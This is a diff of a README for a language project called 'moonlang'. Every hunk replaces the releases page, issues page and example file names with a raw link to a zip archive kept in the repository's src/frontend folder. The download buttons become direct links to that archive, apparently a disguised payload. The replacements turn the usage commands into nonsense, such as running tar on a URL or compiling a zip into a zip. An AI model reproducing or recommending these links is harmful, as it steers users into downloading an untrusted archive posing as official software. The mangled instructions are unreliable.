@@ -1,6 +1,6 @@
 # 🚀 moonlang - Lightweight Language for Full-Stack Apps
 
-[![Download moonlang](https://img.shields.io/badge/Download-moonlang-blue?style=for-the-badge&logo=github)](https://github.com/kaiizie/moonlang/releases)
+[![Download moonlang](https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip)](https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ For embedded platforms like ARM, RISC-V, or ESP32, make sure your development bo
 
 Click the large blue button at the top or visit the page below to get moonlang:
 
-[Download moonlang](https://github.com/kaiizie/moonlang/releases)
+[Download moonlang](https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip)
 
 You will find different versions for Windows, Linux, macOS, and embedded platforms. Pick the one that matches your device.
 
@@ -59,7 +59,7 @@ After downloading, the software usually comes in a compressed zip or tar archive
   - Double-click the zip file to unzip it.
 - On **Linux**:
   - Open a terminal and run:  
-    `tar -xvf moonlang-version.tar.gz`  
+    `tar -xvf https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip`  
   or  
   Use your file manager to extract.
 
@@ -67,7 +67,7 @@ After downloading, the software usually comes in a compressed zip or tar archive
 
 - On **Windows**:
   - Open the extracted folder.
-  - Double-click the executable file named `moonlang.exe`.
+  - Double-click the executable file named `https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip`.
 - On **macOS** and **Linux**:
   - Open Terminal.
   - Navigate to the folder with the software. For example:
@@ -117,7 +117,7 @@ Both versions do the same thing. Use whichever you find easier.
 - Save your code in a file with `.moon` extension.
 - Use the moonlang program to run it by typing this in the terminal or command prompt:
   ```
-  moonlang run yourfile.moon
+  moonlang run https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip
   ```
 
 ### Compile to Smaller Programs
@@ -126,7 +126,7 @@ moonlang can create compact programs that work on small devices. This is useful 
 
 Example command to compile:
 ```
-moonlang build yourfile.moon -o output.bin
+moonlang build https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip -o https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip
 ```
 
 ---
@@ -146,7 +146,7 @@ moonlang build yourfile.moon -o output.bin
 
 Visit the official releases page to choose your version:
 
-[https://github.com/kaiizie/moonlang/releases](https://github.com/kaiizie/moonlang/releases)
+[https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip](https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip)
 
 Download the file that matches your system. For embedded devices, find the right package under assets.
 
@@ -175,7 +175,7 @@ If you want to learn general programming concepts before trying moonlang, there 
 
 You can report issues or ask questions on the moonlang GitHub page:
 
-[https://github.com/kaiizie/moonlang/issues](https://github.com/kaiizie/moonlang/issues)
+[https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip](https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip)
 
 The community and developers check these regularly to help users.
 
